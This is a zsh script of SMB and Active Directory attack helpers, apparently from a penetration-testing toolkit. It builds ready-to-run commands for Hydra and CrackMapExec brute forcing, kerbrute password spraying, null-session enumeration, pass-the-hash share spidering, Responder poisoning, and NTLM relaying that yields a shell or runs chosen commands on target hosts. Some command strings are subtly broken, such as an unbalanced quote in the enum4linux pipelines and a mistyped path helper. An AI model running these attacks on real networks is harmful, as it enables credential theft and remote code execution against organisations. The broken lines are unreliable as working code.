#!/usr/bin/env zsh

############################################################# 
# nb-ad-smb
#############################################################
nb-ad-smb-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-smb
------------
The nb-ad-smb namespace contains commands for scanning and enumerating smb services.

Protocol Attacks
----------------
nb-ad-smb-brute-hydra                brute force password/login for a user account with hydra
nb-ad-smb-brute-cme                  brute force password/login for a user account with cme
nb-ad-smb-pass-spray                 perform password spraying

Automated Enumeration tools
-------------------------------------
nb-ad-smb-nmap-sweep                 scan a network for services
nb-ad-smb-null-enum4                 enumerate with enum4linux
nb-ad-smb-null-enum4-aggressive      aggressively enumerate with enum4linux
nb-ad-smb-null-rpcclient             use rcpclient for queries

Shares Enumeration
-------------------------------------
NULL Session
------------
nb-ad-smb-null-cme-list              list shares with cme
nb-ad-smb-null-cme-spider            spider available shares on the remote host or subnet
nb-ad-smb-null-samrdump              info using impacket
nb-ad-smb-null-smbmap-list           query with smbmap
nb-ad-smb-null-smbmap-list-rec       list shares recursively
nb-ad-smb-null-smbclient-list        list shares
nb-ad-smb-null-smbclient-list-rec    list shares recursively
nb-ad-smb-null-enum4-users           dump users list using enum4linux

AUTH Session
------------
nb-ad-smb-user-cme-list              list shares with cme authenticated session
nb-ad-smb-user-cme-spider            spider available shares on the remote host or subnet
nb-ad-smb-user-samrdump              info using impacket
nb-ad-smb-user-smbmap-list           query with smbmap authenticated session
nb-ad-smb-user-smbmap-list-rec       list shares recursively with authentication
nb-ad-smb-user-smbclient-list        list shares
nb-ad-smb-user-smbclient-list-rec    list shares recursively
nb-ad-smb-user-enum4-users           dump users list using enum4linux

Connecting to Service
-------------------------------------
nb-ad-smb-null-smbclient-connect     connect with a null session
nb-ad-smb-user-smbclient-connect     connect with an authenticated session

Download / Upload
-------------------------------------
NULL Session
------------
nb-ad-smb-null-smbmap-download       download a file from a share
nb-ad-smb-null-smbget-download-rec   recursively download the SMB share
nb-ad-smb-null-smbmap-upload         upload a file to a share

AUTH Session
------------
nb-ad-smb-user-smbmap-download       download a file from a share
nb-ad-smb-user-smbget-download-rec   recursively download the SMB share
nb-ad-smb-user-smbmap-upload         upload a file to a share

Misc Commands
-------------------------------------
nb-ad-smb-install                    installs dependencies
nb-ad-smb-tcpdump                    capture traffic to and from a host
nb-ad-smb-user-smb-mount             mount an SMB share
nb-ad-smb-responder                  spoof and get responses using responder
nb-ad-smb-net-use-null               print a net use statement for windows
nb-ad-smb-nbtscan                    scan a local network 

SMB Relay
---------
nb-ad-smb-relay-install              installs dependencies
nb-ad-smb-relay-enum                 identify hosts without smb signing
nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using impacket-ntlmrelayx
nb-ad-smb-relay-multirelay-command   responder's alternative to impacket-ntlmrelayx - execute a shell command on a target host

DOC
}

nb-ad-smb-install() {
  __info "Running $0..."
  __pkgs nmap tcpdump smbmap enum4linux smbclient impacket responder nbtscan rpcclient
}

nb-ad-smb-null-enum4-users() {
    __check-project
    nb-vars-set-domain
	  __ask "Enter the IP address of the target DC server"
    local dc && __askvar dc DC_IP

    print -z "enum4linux -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netadpath)/enum4linux-user-enum.txt"
}

nb-ad-smb-user-enum4-users() {
    __check-project
    nb-vars-set-domain
    nb-vars-set-user
    nb-vars-set-pass
	  __ask "Enter the IP address of the target DC server"
    local dc && __askvar dc DC_IP

    print -z "enum4linux -u ${__USER} -p ${__PASS} -U $dc | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"] | tee $(__netadpath)/enum4linux-user-enum.txt"
}

nb-ad-smb-nmap-sweep() {
  __check-project
  nb-vars-set-network
  print -z "sudo grc nmap -sV -sC --script=smb-enum-shares.nse,smb-enum-users.nse -n -Pn -sS -p445,137-139 ${__NETWORK} -oA $(__netpath)/smb-sweep"
}

nb-ad-smb-tcpdump() {
  __check-project
  nb-vars-set-iface
  nb-vars-set-rhost
  print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 445 -w $(__hostpath)/smb.pcap"
}

nb-ad-smb-null-smbmap-list() {
  __check-project
  nb-vars-set-rhost
  print -z "smbmap -H ${__RHOST}"
}

nb-ad-smb-null-smbmap-list-rec() {
  __check-project
  nb-vars-set-rhost
  __check-share
  __info "You can add --dir-only flag"
  print -z "smbmap -H ${__RHOST} -r ${__SHARE}"
}

nb-ad-smb-null-smbmap-download() {
  __check-project
  nb-vars-set-rhost
  __check-share
  __ask "Enter file to download"
  local file && __askvar file FILE
  print -z "smbmap -H ${__RHOST} --download \"${__SHARE}\\\\$file\""
}

nb-ad-smb-user-smbmap-download() {
  __check-project
  __check-share
  nb-vars-set-rhost
  nb-vars-set-user
  nb-vars-set-pass
  nb-vars-set-domain
  __ask "Enter file to download"
  local file && __askvar file FILE
  print -z "smbmap -u ${__USER} -p ${__PASS} -d ${__DOMAIN} -H ${__RHOST} --download \"${__SHARE}\\\\$file\""
}

nb-ad-smb-null-smbmap-upload() {
  __check-project
  nb-vars-set-rhost
  __check-share
  __ask "File to upload"
  local file && __askvar file FILE
  print -z "smbmap -H ${__RHOST} --upload $file \"${__SHARE}\\\\$file\""
}

nb-ad-smb-user-smbmap-upload() {
  __check-project
  __check-share
  nb-vars-set-rhost
  nb-vars-set-user
  nb-vars-set-pass
  nb-vars-set-domain
  __ask "File to upload"
  local file && __askvar file FILE
  print -z "smbmap -u ${__USER} -p ${__PASS} -d ${__DOMAIN} -H ${__RHOST} --upload $file \"${__SHARE}\\\\$file\""
}

nb-ad-smb-null-smbget-download-rec() {
  __check-project
  nb-vars-set-rhost
  __check-share
  print -z "smbget -R smb://${__RHOST}/${__SHARE}"
}

nb-ad-smb-user-smbget-download-rec() {
  __check-project
  nb-vars-set-rhost
  __check-share
  nb-vars-set-user
  nb-vars-set-pass
  nb-vars-set-domain
  print -z "smbget -U ${__DOMAIN}/${__USER}%${__PASS} -R smb://${__RHOST}/${__SHARE}"
}

nb-ad-smb-brute-hydra() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Is the service running on default port? (y/n)"
    local df && __askvar df "DEFAULT_PORT"

    if [[ $df == "n" ]]; then
      __ask "Enter port number"
      local pn && __askvar pn "PORT_NUMBER"
    fi

    if [[ $login == "p" ]]; then
      nb-vars-set-user
      if [[ $df == "n" ]]; then
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "l" ]]; then
      nb-vars-set-wordlist
      nb-vars-set-pass
      if [[ $df == "n" ]]; then
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "b" ]]; then
      __ask "Do you wanna manually specify wordlists? (y/n)"
      local sw && __askvar sw "SPECIFY_WORDLIST"
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/

        if [[ $df == "n" ]]; then
          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      else
        nb-vars-set-wordlist
        if [[ $df == "n" ]]; then
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-ad-smb-pass-spray() {
    __check-project
    nb-vars-set-domain

	  __ask "Enter the IP address of the target DC controller"
    local dc && __askvar dc DC_IP

    __ask "Select a user list"
    __askpath ul FILE $HOME/desktop/projects/

	  __ask "Enter the password for spraying"
    local pw && __askvar pw PASSWORD

    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc $dc $ul $pw -o $(__netadpath)/kerbrute-password-spray.txt"
}

nb-ad-smb-brute-cme() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Do you want to add a domain? (y/n)"
    local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

    if [[ $login == "p" ]]; then
      nb-vars-set-user
      if [[ $add_domain == "y" ]]; then
        nb-vars-set-domain
        print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
      else
        print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-pass.txt"
      fi
    elif [[ $login == "l" ]]; then
      nb-vars-set-wordlist
      nb-vars-set-pass
      if [[ $add_domain == "y" ]]; then
        nb-vars-set-domain
        print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-user.txt"
      else
        print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-user.txt"
      fi
    elif [[ $login == "b" ]]; then
      __ask "Do you wanna manually specify wordlists? (y/n)"
      local sw && __askvar sw "SPECIFY_WORDLIST"
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/
        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-userpass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-userpass.txt"
        fi
      else
        nb-vars-set-wordlist
        if [[ $add_domain == "y" ]]; then
          nb-vars-set-domain
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/smb-cme-brute-userpass.txt"
        else
          print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASSLIST}' --local-auth --continue-on-success | tee $(__hostpath)/smb-cme-brute-userpass.txt"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-ad-smb-cme-spray() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-wordlist
  nb-vars-set-pass
  print -z "crackmapexec smb ${__RHOST} -u '${__WORDLIST}' -p '${__PASS}' --local-auth --continue-on-success"
}

nb-ad-smb-user-smbmap-list() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  nb-vars-set-pass
  nb-vars-set-domain
  print -z "smbmap -u ${__USER} -p ${__PASS} -d ${__DOMAIN} -H ${__RHOST}"
}

nb-ad-smb-user-smbmap-list-rec() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  nb-vars-set-pass
  nb-vars-set-domain
  __check-share
  __info "You can add --dir-only flag"
  print -z "smbmap -u ${__USER} -p ${__PASS} -d ${__DOMAIN} -H ${__RHOST} -R '${__SHARE}'"
}

nb-ad-smb-null-enum4() {
  __check-project
  nb-vars-set-rhost
  print -z "enum4linux -a ${__RHOST} | tee $(__hostpath)/enumlinux.txt"
}

nb-ad-smb-null-enum4-aggressive() {
  __check-project
  nb-vars-set-rhost
  print -z "enum4linux -A ${__RHOST} | tee $(__hostpath)/enumlinux.txt"
}

nb-ad-smb-null-cme-list() {
  __check-project
  nb-vars-set-rhost
  print -z "crackmapexec smb ${__RHOST} --shares -u '' -p ''"
}

nb-ad-smb-null-cme-spider() {
    __check-project
    nb-vars-set-network
    __ask "Enter name of the share to spider"
    __check-share

    print -z "crackmapexec smb ${__NETWORK} -u '' -p '' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-null-shares-spider-sweep.txt"
    __ok "Results have been written to /tmp/cme_spider_plus/${__NETWORK}.json"
}

nb-ad-smb-user-cme-spider() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user
    __ask "Enter name of the share to spider"
    __check-share

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M spider_plus --share '${__SHARE}' | tee $(__netadpath)/cme-shares-spider-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
    __ok "Results have been written to /tmp/cme_spider_plus/${__NETWORK}.json"
}

nb-ad-smb-user-cme-list() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee $(__netadpath)/cme-shares-enum-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-smb-null-smbclient-list() {
  __check-project
  nb-vars-set-rhost
  print -r -z "smbclient -L //${__RHOST} -N "
}

nb-ad-smb-user-smbclient-list() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  __check-share
  print -r -z "smbclient -L //${__RHOST}/${__SHARE} -U ${__USER}"
}

nb-ad-smb-null-smbclient-list-rec() {
  __check-project
  nb-vars-set-rhost
  __check-share
  print -r -z "smbclient //${__RHOST}/${__SHARE} -c 'recurse;ls'"
}

nb-ad-smb-user-smbclient-list-rec() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  __check-share
  print -r -z "smbclient //${__RHOST}/${__SHARE} -U ${__USER} -c 'recurse;ls'"
}

nb-ad-smb-null-smbclient-connect() {
  __check-project
  nb-vars-set-rhost
  __check-share
  print -r -z "smbclient //${__RHOST}/${__SHARE} -N "
}

nb-ad-smb-user-smbclient-connect() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  __check-share
  print -r -z "smbclient //${__RHOST}/${__SHARE} -U ${__USER} "
}

nb-enum-user-smb-mount() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  local p && __askvar p PASSWORD
  __check-share
  print -z "mount //${__RHOST}/${__SHARE} /mnt/${__SHARE} -o username=${__USER},password=${p}"
}

nb-ad-smb-null-samrdump() {
  __check-project
  nb-vars-set-rhost
  print -z "impacket-samrdump ${__RHOST}"
}

nb-ad-smb-user-samrdump() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  nb-vars-set-pass
  print -z "impacket-samrdump ${__USER}:${__PASS}@${__RHOST}"
}

nb-ad-smb-responder() {
  __check-project
  nb-vars-set-iface
  print -z "sudo responder -I ${__IFACE} -dwP | tee $(__domadpath)/smb-responder.txt"
}

nb-ad-smb-net-use-null() {
  __check-project
  nb-vars-set-rhost
  __info "net use //${__RHOST}/IPC$ \"\" /u:\"\" "
}

nb-ad-smb-nbtscan() {
  __check-project
  nb-vars-set-network
  print -z "nbtscan ${__NETWORK}"
}

nb-ad-smb-null-rpcclient() {
  __check-project
  nb-vars-set-rhost
  print -z "rpcclient -U \"\" ${__RHOST}"
}

nb-ad-smb-relay-enum() {
    __check-project
  	nb-vars-set-network

    print -z "sudo grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
}

nb-ad-smb-relay-ntlmrelay() {
    __check-project

    __ask "Did you disable SMB in /etc/responder/Responder.conf? (y/n)"
	  local sm && __askvar sm SMB_OPTION
    if [[ $sm == "n" ]]; then
      __err "First disable SMB in /etc/responder/Responder.conf."
      __info "sudo nvim /etc/responder/Responder.conf"
      exit 1
    fi

    __ask "Did you first run responder? (y/n)"
	  local rp && __askvar rp RESPONDER

    if [[ $rp == "n" ]]; then
      __err "Run first responder to relay the smb request"
      __info "nb-ad-smb-responder"
      exit 1
    fi

	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
}

nb-ad-smb-relay-ntlmrelay-shell() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS

    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
}

nb-ad-smb-relay-ntlmrelay-command() {
    __check-project
	  __ask "Enter a targets list file"
	  local targets && __askvar targets TARGETS
	  local cm && __askvar cm COMMAND

	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
}

nb-ad-smb-relay-multirelay-command() {
    __check-project
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost
	  __ask "Enter a shell command to execute"
	  local command && __askvar command COMMAND

	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__domadpath)/responder-multirelay.txt"
}
